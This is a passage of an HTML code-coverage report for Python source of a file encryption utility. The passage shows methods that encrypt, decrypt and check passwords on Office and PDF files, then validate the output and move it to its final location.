    <p class="run run2"><span class="n"><a id="t258" href="#t258">258</a></span><span class="t">                <span class="str">'successful_files'</span><span class="op">:</span> <span class="nam">successful_files</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t259" href="#t259">259</a></span><span class="t">                <span class="str">'failed_files'</span><span class="op">:</span> <span class="nam">failed_files</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t260" href="#t260">260</a></span><span class="t">                <span class="str">'total_files'</span><span class="op">:</span> <span class="nam">len</span><span class="op">(</span><span class="nam">validated_files</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t261" href="#t261">261</a></span><span class="t">            <span class="op">}</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t262" href="#t262">262</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t263" href="#t263">263</a></span><span class="t">    <span class="key">def</span> <span class="nam">_process_single_file</span><span class="op">(</span><span class="nam">self</span><span class="op">,</span> <span class="nam">file_manifest</span><span class="op">:</span> <span class="nam">FileManifest</span><span class="op">,</span> <span class="nam">operation</span><span class="op">:</span> <span class="nam">str</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t264" href="#t264">264</a></span><span class="t">                           <span class="nam">output_dir</span><span class="op">:</span> <span class="nam">Optional</span><span class="op">[</span><span class="nam">Path</span><span class="op">]</span><span class="op">,</span> <span class="nam">processing_dir</span><span class="op">:</span> <span class="nam">Path</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t265" href="#t265">265</a></span><span class="t">                           <span class="nam">output_temp_dir</span><span class="op">:</span> <span class="nam">Path</span><span class="op">)</span> <span class="op">-></span> <span class="str">'FileProcessingResult'</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t266" href="#t266">266</a></span><span class="t">        <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t267" href="#t267">267</a></span><span class="t"><span class="str">        D2c-D4g: Process single file through complete pipeline</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t268" href="#t268">268</a></span><span class="t"><span class="str">        """</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t269" href="#t269">269</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t270" href="#t270">270</a></span><span class="t">        <span class="com"># D2c: Get Crypto Handler</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t271" href="#t271">271</a></span><span class="t">        <span class="nam">handler</span> <span class="op">=</span> <span class="nam">self</span><span class="op">.</span><span class="nam">crypto_handlers</span><span class="op">[</span><span class="nam">file_manifest</span><span class="op">.</span><span class="nam">crypto_tool</span><span class="op">]</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t272" href="#t272">272</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t273" href="#t273">273</a></span><span class="t">        <span class="com"># D2d: Find Working Password</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t274" href="#t274">274</a></span><span class="t">        <span class="key">if</span> <span class="nam">operation</span> <span class="key">in</span> <span class="op">[</span><span class="str">'decrypt'</span><span class="op">,</span> <span class="str">'check-password'</span><span class="op">]</span> <span class="key">and</span> <span class="nam">file_manifest</span><span class="op">.</span><span class="nam">is_encrypted</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t275" href="#t275">275</a></span><span class="t">            <span class="nam">password</span> <span class="op">=</span> <span class="nam">self</span><span class="op">.</span><span class="nam">password_manager</span><span class="op">.</span><span class="nam">find_working_password</span><span class="op">(</span><span class="nam">file_manifest</span><span class="op">.</span><span class="nam">path</span><span class="op">,</span> <span class="nam">handler</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t276" href="#t276">276</a></span><span class="t">            <span class="key">if</span> <span class="key">not</span> <span class="nam">password</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t277" href="#t277">277</a></span><span class="t">                <span class="key">raise</span> <span class="nam">ProcessingError</span><span class="op">(</span><span class="fst">f"</span><span class="fst">No working password found for </span><span class="op">{</span><span class="nam">file_manifest</span><span class="op">.</span><span class="nam">path</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t278" href="#t278">278</a></span><span class="t">        <span class="key">elif</span> <span class="nam">operation</span> <span class="op">==</span> <span class="str">'encrypt'</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t279" href="#t279">279</a></span><span class="t">            <span class="com"># For encryption, use first available password</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t280" href="#t280">280</a></span><span class="t">            <span class="nam">passwords</span> <span class="op">=</span> <span class="nam">self</span><span class="op">.</span><span class="nam">password_manager</span><span class="op">.</span><span class="nam">get_password_candidates</span><span class="op">(</span><span class="nam">file_manifest</span><span class="op">.</span><span class="nam">path</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t281" href="#t281">281</a></span><span class="t">            <span class="key">if</span> <span class="key">not</span> <span class="nam">passwords</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t282" href="#t282">282</a></span><span class="t">                <span class="key">raise</span> <span class="nam">ProcessingError</span><span class="op">(</span><span class="fst">f"</span><span class="fst">No password specified for encryption of </span><span class="op">{</span><span class="nam">file_manifest</span><span class="op">.</span><span class="nam">path</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t283" href="#t283">283</a></span><span class="t">            <span class="nam">password</span> <span class="op">=</span> <span class="nam">passwords</span><span class="op">[</span><span class="num">0</span><span class="op">]</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t284" href="#t284">284</a></span><span class="t">        <span class="key">else</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t285" href="#t285">285</a></span><span class="t">            <span class="nam">password</span> <span class="op">=</span> <span class="key">None</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t286" href="#t286">286</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t287" href="#t287">287</a></span><span class="t">        <span class="com"># D2e-D2f: Setup Temp File Paths and Copy Input</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t288" href="#t288">288</a></span><span class="t">        <span class="nam">temp_input</span> <span class="op">=</span> <span class="nam">processing_dir</span> <span class="op">/</span> <span class="fst">f'</span><span class="fst">input_</span><span class="op">{</span><span class="nam">file_manifest</span><span class="op">.</span><span class="nam">path</span><span class="op">.</span><span class="nam">name</span><span class="op">}</span><span class="fst">'</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t289" href="#t289">289</a></span><span class="t">        <span class="nam">temp_output</span> <span class="op">=</span> <span class="nam">output_temp_dir</span> <span class="op">/</span> <span class="fst">f'</span><span class="fst">output_</span><span class="op">{</span><span class="nam">file_manifest</span><span class="op">.</span><span class="nam">path</span><span class="op">.</span><span class="nam">name</span><span class="op">}</span><span class="fst">'</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t290" href="#t290">290</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t291" href="#t291">291</a></span><span class="t">        <span class="nam">shutil</span><span class="op">.</span><span class="nam">copy2</span><span class="op">(</span><span class="nam">file_manifest</span><span class="op">.</span><span class="nam">path</span><span class="op">,</span> <span class="nam">temp_input</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t292" href="#t292">292</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t293" href="#t293">293</a></span><span class="t">        <span class="com"># D2g-D2h: Perform Crypto Operation</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t294" href="#t294">294</a></span><span class="t">        <span class="key">if</span> <span class="nam">operation</span> <span class="op">==</span> <span class="str">'encrypt'</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t295" href="#t295">295</a></span><span class="t">            <span class="nam">handler</span><span class="op">.</span><span class="nam">encrypt_file</span><span class="op">(</span><span class="nam">temp_input</span><span class="op">,</span> <span class="nam">temp_output</span><span class="op">,</span> <span class="nam">password</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t296" href="#t296">296</a></span><span class="t">        <span class="key">elif</span> <span class="nam">operation</span> <span class="op">==</span> <span class="str">'decrypt'</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t297" href="#t297">297</a></span><span class="t">            <span class="nam">handler</span><span class="op">.</span><span class="nam">decrypt_file</span><span class="op">(</span><span class="nam">temp_input</span><span class="op">,</span> <span class="nam">temp_output</span><span class="op">,</span> <span class="nam">password</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t298" href="#t298">298</a></span><span class="t">        <span class="key">elif</span> <span class="nam">operation</span> <span class="op">==</span> <span class="str">'check-password'</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t299" href="#t299">299</a></span><span class="t">            <span class="com"># For check-password, just verify we can open with password</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t300" href="#t300">300</a></span><span class="t">            <span class="key">if</span> <span class="nam">file_manifest</span><span class="op">.</span><span class="nam">is_encrypted</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t301" href="#t301">301</a></span><span class="t">                <span class="key">if</span> <span class="key">not</span> <span class="nam">handler</span><span class="op">.</span><span class="nam">test_password</span><span class="op">(</span><span class="nam">temp_input</span><span class="op">,</span> <span class="nam">password</span><span class="op">)</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t302" href="#t302">302</a></span><span class="t">                    <span class="key">raise</span> <span class="nam">ProcessingError</span><span class="op">(</span><span class="fst">f"</span><span class="fst">Password verification failed for </span><span class="op">{</span><span class="nam">file_manifest</span><span class="op">.</span><span class="nam">path</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t303" href="#t303">303</a></span><span class="t">            <span class="com"># No output file needed for check-password</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t304" href="#t304">304</a></span><span class="t">            <span class="nam">temp_output</span> <span class="op">=</span> <span class="key">None</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t305" href="#t305">305</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t306" href="#t306">306</a></span><span class="t">        <span class="com"># D3a-D3d: Output Validation (if output file was created)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t307" href="#t307">307</a></span><span class="t">        <span class="key">if</span> <span class="nam">temp_output</span> <span class="key">and</span> <span class="nam">operation</span> <span class="op">!=</span> <span class="str">'check-password'</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t308" href="#t308">308</a></span><span class="t">            <span class="nam">self</span><span class="op">.</span><span class="nam">_validate_output_file</span><span class="op">(</span><span class="nam">temp_output</span><span class="op">,</span> <span class="nam">file_manifest</span><span class="op">,</span> <span class="nam">operation</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t309" href="#t309">309</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t310" href="#t310">310</a></span><span class="t">        <span class="com"># D4a-D4g: File Movement and Final Result</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t311" href="#t311">311</a></span><span class="t">        <span class="key">if</span> <span class="nam">operation</span> <span class="op">!=</span> <span class="str">'check-password'</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t312" href="#t312">312</a></span><span class="t">            <span class="nam">final_path</span> <span class="op">=</span> <span class="nam">self</span><span class="op">.</span><span class="nam">_move_to_final_location</span><span class="op">(</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t313" href="#t313">313</a></span><span class="t">                <span class="nam">temp_output</span><span class="op">,</span> <span class="nam">file_manifest</span><span class="op">.</span><span class="nam">path</span><span class="op">,</span> <span class="nam">output_dir</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t314" href="#t314">314</a></span><span class="t">            <span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t315" href="#t315">315</a></span><span class="t">        <span class="key">else</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t316" href="#t316">316</a></span><span class="t">            <span class="nam">final_path</span> <span class="op">=</span> <span class="nam">file_manifest</span><span class="op">.</span><span class="nam">path</span>  <span class="com"># No file movement for check-password</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t317" href="#t317">317</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t318" href="#t318">318</a></span><span class="t">        <span class="com"># D4f-D4g: Create Processing Result</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t319" href="#t319">319</a></span><span class="t">        <span class="key">return</span> <span class="nam">FileProcessingResult</span><span class="op">(</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t320" href="#t320">320</a></span><span class="t">            <span class="nam">original_path</span><span class="op">=</span><span class="nam">file_manifest</span><span class="op">.</span><span class="nam">path</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t321" href="#t321">321</a></span><span class="t">            <span class="nam">final_path</span><span class="op">=</span><span class="nam">final_path</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t322" href="#t322">322</a></span><span class="t">            <span class="nam">operation</span><span class="op">=</span><span class="nam">operation</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t323" href="#t323">323</a></span><span class="t">            <span class="nam">password_used</span><span class="op">=</span><span class="nam">password</span> <span class="key">is</span> <span class="key">not</span> <span class="key">None</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t324" href="#t324">324</a></span><span class="t">            <span class="nam">checksum</span><span class="op">=</span><span class="nam">self</span><span class="op">.</span><span class="nam">_calculate_checksum</span><span class="op">(</span><span class="nam">final_path</span><span class="op">)</span> <span class="key">if</span> <span class="nam">final_path</span><span class="op">.</span><span class="nam">exists</span><span class="op">(</span><span class="op">)</span> <span class="key">else</span> <span class="key">None</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t325" href="#t325">325</a></span><span class="t">        <span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t326" href="#t326">326</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t327" href="#t327">327</a></span><span class="t">    <span class="key">def</span> <span class="nam">_validate_output_file</span><span class="op">(</span><span class="nam">self</span><span class="op">,</span> <span class="nam">temp_output</span><span class="op">:</span> <span class="nam">Path</span><span class="op">,</span> <span class="nam">file_manifest</span><span class="op">:</span> <span class="nam">FileManifest</span><span class="op">,</span> <span class="nam">operation</span><span class="op">:</span> <span class="nam">str</span><span class="op">)</span> <span class="op">-></span> <span class="key">None</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t328" href="#t328">328</a></span><span class="t">        <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t329" href="#t329">329</a></span><span class="t"><span class="str">        D3a-D3d: Output Validation</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t330" href="#t330">330</a></span><span class="t"><span class="str">        Validate the processed output file</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t331" href="#t331">331</a></span><span class="t"><span class="str">        """</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t332" href="#t332">332</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t333" href="#t333">333</a></span><span class="t">        <span class="com"># D3a: Validate Output File Exists</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t334" href="#t334">334</a></span><span class="t">        <span class="key">if</span> <span class="key">not</span> <span class="nam">temp_output</span><span class="op">.</span><span class="nam">exists</span><span class="op">(</span><span class="op">)</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t335" href="#t335">335</a></span><span class="t">            <span class="key">raise</span> <span class="nam">ProcessingError</span><span class="op">(</span><span class="str">"Crypto operation did not create output file"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t336" href="#t336">336</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t337" href="#t337">337</a></span><span class="t">        <span class="com"># D3b: Check Output File Size</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t338" href="#t338">338</a></span><span class="t">        <span class="nam">output_size</span> <span class="op">=</span> <span class="nam">temp_output</span><span class="op">.</span><span class="nam">stat</span><span class="op">(</span><span class="op">)</span><span class="op">.</span><span class="nam">st_size</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t339" href="#t339">339</a></span><span class="t">        <span class="key">if</span> <span class="nam">output_size</span> <span class="op">==</span> <span class="num">0</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t340" href="#t340">340</a></span><span class="t">            <span class="key">raise</span> <span class="nam">ProcessingError</span><span class="op">(</span><span class="str">"Output file is empty"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t341" href="#t341">341</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t342" href="#t342">342</a></span><span class="t">        <span class="com"># D3c: Format-Specific Validation</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t343" href="#t343">343</a></span><span class="t">        <span class="key">try</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t344" href="#t344">344</a></span><span class="t">            <span class="key">if</span> <span class="nam">file_manifest</span><span class="op">.</span><span class="nam">crypto_tool</span> <span class="op">==</span> <span class="str">'msoffcrypto'</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t345" href="#t345">345</a></span><span class="t">                <span class="com"># D3c_Office: Validate Office Document</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t346" href="#t346">346</a></span><span class="t">                <span class="key">import</span> <span class="nam">msoffcrypto</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t347" href="#t347">347</a></span><span class="t">                <span class="key">with</span> <span class="nam">open</span><span class="op">(</span><span class="nam">temp_output</span><span class="op">,</span> <span class="str">'rb'</span><span class="op">)</span> <span class="key">as</span> <span class="nam">f</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t348" href="#t348">348</a></span><span class="t">                    <span class="nam">office_file</span> <span class="op">=</span> <span class="nam">msoffcrypto</span><span class="op">.</span><span class="nam">OfficeFile</span><span class="op">(</span><span class="nam">f</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t349" href="#t349">349</a></span><span class="t">                    <span class="com"># Try to read document structure</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t350" href="#t350">350</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t351" href="#t351">351</a></span><span class="t">            <span class="key">elif</span> <span class="nam">file_manifest</span><span class="op">.</span><span class="nam">crypto_tool</span> <span class="op">==</span> <span class="str">'PyPDF2'</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t352" href="#t352">352</a></span><span class="t">                <span class="com"># D3c_PDF: Validate PDF Document</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t353" href="#t353">353</a></span><span class="t">                <span class="key">import</span> <span class="nam">PyPDF2</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t354" href="#t354">354</a></span><span class="t">                <span class="key">with</span> <span class="nam">open</span><span class="op">(</span><span class="nam">temp_output</span><span class="op">,</span> <span class="str">'rb'</span><span class="op">)</span> <span class="key">as</span> <span class="nam">f</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t355" href="#t355">355</a></span><span class="t">                    <span class="nam">pdf_reader</span> <span class="op">=</span> <span class="nam">PyPDF2</span><span class="op">.</span><span class="nam">PdfReader</span><span class="op">(</span><span class="nam">f</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t356" href="#t356">356</a></span><span class="t">                    <span class="com"># Try to read PDF structure</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t357" href="#t357">357</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t358" href="#t358">358</a></span><span class="t">        <span class="key">except</span> <span class="nam">Exception</span> <span class="key">as</span> <span class="nam">e</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t359" href="#t359">359</a></span><span class="t">            <span class="key">raise</span> <span class="nam">ProcessingError</span><span class="op">(</span><span class="fst">f"</span><span class="fst">Output file validation failed: </span><span class="op">{</span><span class="nam">e</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t360" href="#t360">360</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t361" href="#t361">361</a></span><span class="t">        <span class="com"># D3d: Validate Encryption Status Changed</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t362" href="#t362">362</a></span><span class="t">        <span class="nam">current_encrypted</span> <span class="op">=</span> <span class="nam">self</span><span class="op">.</span><span class="nam">_detect_encryption_status_for_validation</span><span class="op">(</span><span class="nam">temp_output</span><span class="op">,</span> <span class="nam">file_manifest</span><span class="op">.</span><span class="nam">format</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t363" href="#t363">363</a></span><span class="t">        <span class="nam">expected_encrypted</span> <span class="op">=</span> <span class="nam">operation</span> <span class="op">==</span> <span class="str">'encrypt'</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t364" href="#t364">364</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t365" href="#t365">365</a></span><span class="t">        <span class="key">if</span> <span class="nam">current_encrypted</span> <span class="op">!=</span> <span class="nam">expected_encrypted</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t366" href="#t366">366</a></span><span class="t">            <span class="key">raise</span> <span class="nam">ProcessingError</span><span class="op">(</span><span class="fst">f"</span><span class="fst">Encryption status not changed correctly (expected: </span><span class="op">{</span><span class="nam">expected_encrypted</span><span class="op">}</span><span class="fst">, actual: </span><span class="op">{</span><span class="nam">current_encrypted</span><span class="op">}</span><span class="fst">)</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t367" href="#t367">367</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t368" href="#t368">368</a></span><span class="t">    <span class="key">def</span> <span class="nam">_detect_encryption_status_for_validation</span><span class="op">(</span><span class="nam">self</span><span class="op">,</span> <span class="nam">file_path</span><span class="op">:</span> <span class="nam">Path</span><span class="op">,</span> <span class="nam">file_format</span><span class="op">:</span> <span class="nam">str</span><span class="op">)</span> <span class="op">-></span> <span class="nam">bool</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t369" href="#t369">369</a></span><span class="t">        <span class="str">"""Helper to detect encryption status for validation"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t370" href="#t370">370</a></span><span class="t">        <span class="nam">crypto_tool</span> <span class="op">=</span> <span class="nam">FastPassConfig</span><span class="op">.</span><span class="nam">SUPPORTED_FORMATS</span><span class="op">[</span><span class="nam">file_format</span><span class="op">]</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t371" href="#t371">371</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t372" href="#t372">372</a></span><span class="t">        <span class="key">try</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t373" href="#t373">373</a></span><span class="t">            <span class="key">with</span> <span class="nam">open</span><span class="op">(</span><span class="nam">file_path</span><span class="op">,</span> <span class="str">'rb'</span><span class="op">)</span> <span class="key">as</span> <span class="nam">f</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t374" href="#t374">374</a></span><span class="t">                <span class="key">if</span> <span class="nam">crypto_tool</span> <span class="op">==</span> <span class="str">'msoffcrypto'</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t375" href="#t375">375</a></span><span class="t">                    <span class="key">import</span> <span class="nam">msoffcrypto</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t376" href="#t376">376</a></span><span class="t">                    <span class="nam">office_file</span> <span class="op">=</span> <span class="nam">msoffcrypto</span><span class="op">.</span><span class="nam">OfficeFile</span><span class="op">(</span><span class="nam">f</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t377" href="#t377">377</a></span><span class="t">                    <span class="key">return</span> <span class="nam">office_file</span><span class="op">.</span><span class="nam">is_encrypted</span><span class="op">(</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t378" href="#t378">378</a></span><span class="t">                <span class="key">elif</span> <span class="nam">crypto_tool</span> <span class="op">==</span> <span class="str">'PyPDF2'</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t379" href="#t379">379</a></span><span class="t">                    <span class="key">import</span> <span class="nam">PyPDF2</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t380" href="#t380">380</a></span><span class="t">                    <span class="nam">pdf_reader</span> <span class="op">=</span> <span class="nam">PyPDF2</span><span class="op">.</span><span class="nam">PdfReader</span><span class="op">(</span><span class="nam">f</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t381" href="#t381">381</a></span><span class="t">                    <span class="key">return</span> <span class="nam">pdf_reader</span><span class="op">.</span><span class="nam">is_encrypted</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t382" href="#t382">382</a></span><span class="t">        <span class="key">except</span> <span class="nam">Exception</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t383" href="#t383">383</a></span><span class="t">            <span class="key">return</span> <span class="key">False</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t384" href="#t384">384</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t385" href="#t385">385</a></span><span class="t">        <span class="key">return</span> <span class="key">False</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t386" href="#t386">386</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t387" href="#t387">387</a></span><span class="t">    <span class="key">def</span> <span class="nam">_move_to_final_location</span><span class="op">(</span><span class="nam">self</span><span class="op">,</span> <span class="nam">temp_output</span><span class="op">:</span> <span class="nam">Path</span><span class="op">,</span> <span class="nam">original_path</span><span class="op">:</span> <span class="nam">Path</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t388" href="#t388">388</a></span><span class="t">                              <span class="nam">output_dir</span><span class="op">:</span> <span class="nam">Optional</span><span class="op">[</span><span class="nam">Path</span><span class="op">]</span><span class="op">)</span> <span class="op">-></span> <span class="nam">Path</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
